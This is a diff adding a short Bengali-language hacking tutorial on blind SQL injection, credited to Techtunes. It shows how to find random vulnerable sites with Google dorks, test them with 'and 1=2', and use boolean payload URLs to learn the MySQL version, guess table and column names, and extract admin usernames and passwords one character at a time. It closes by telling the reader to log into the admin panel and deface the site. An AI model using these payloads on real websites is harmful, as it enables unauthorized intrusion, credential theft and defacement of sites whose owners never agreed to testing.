@@ -1,0 +1,26 @@
+BLIND SQL হ্যাকিং 
+
+
+প্রথমে SQL DORK দিয়ে গুগলে সার্চ দিন...
+ inurl:news.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+তারপর যেকনো Site নিন।
+তারপর নিচের Step Follow করেন। Vulnerablity বের করাঃ
+সাইটটি Vulnerable কিনা দেখার জন্য লিংকের শেষে লিখুন "and 1=2"
+উদাহরন : http://example.com/index.php?id=2 and 1=2
+এখন যদি পেজে কোন image/text অথবা যেকোনো কিছু মুছে যায় তবে বুঝতে হবে সাইটটি VulnerableVvv Vulnerable ।MySQL ভার্সন বের করাঃ
+ ভার্সন বের করতে লিখবঃ http:// example.com/index.php?Id=2 and substring(@@version,1,1)=5
+এখন পেজটি যদি নরমাল ভাবে LOAD হয় তাহলে বুঝতে হবে MySQL ভার্সন ৫ ।
+  আর যদি না হয় তবে লিখবঃ http:// example.com/index.Php?Id=2 and substring(@@version,1,1)=4
+এবার পেজ Normally LOAD হলে বুঝতে হবে ভার্সন ৪ ।টেবিল নাম Guess করাঃ
+http:// example.com/index.php?id=1 and (select 1 from table_name limit 0,1)=1
+[ table_name এর জায়গায় Guess করে টেবিল নাম লিখতে হবে ]
+যদি পেজটি Normally LOAD হয় তাহলে বুঝতে হবে টেবিলটি DATABASE এ আছে । মনে করি টেবিল নাম নিলাম admin ।তাহলে পুরা লিঙ্কটি হবেঃ http:// example.com/index.php?id=1 and (select 1 from admin limit 0,1)=1
+টেবিলে কলাম নাম Guess করাঃ
+http:// example.com/index.php?id=1 and (select substring(concat (1,guessed column),1,1) from table limit 0,1)=1
+ধরি admin টেবিল থেকে আমরা username এবং password কলাম পেয়েছিলাম । তাহলে এখন ইউজার নাম বের করতে লিখব এভাবেঃhttp://example.com/index.php?id=1 and (select substring(concat (1,username),1,1) from admin limit 0,1)=1
+[ Password বের করার সময় উপরের লাইনের username এর জায়গায় password লিখতে হবে ]
+ব্যাস username & password পেয়ে গেলে সাইটটির এডমিন প্যানেল খুজে বের করে লগইন করে সাইট Deface দিতে হবে ।
+সুত্র ঃ টেকটিউনস
+
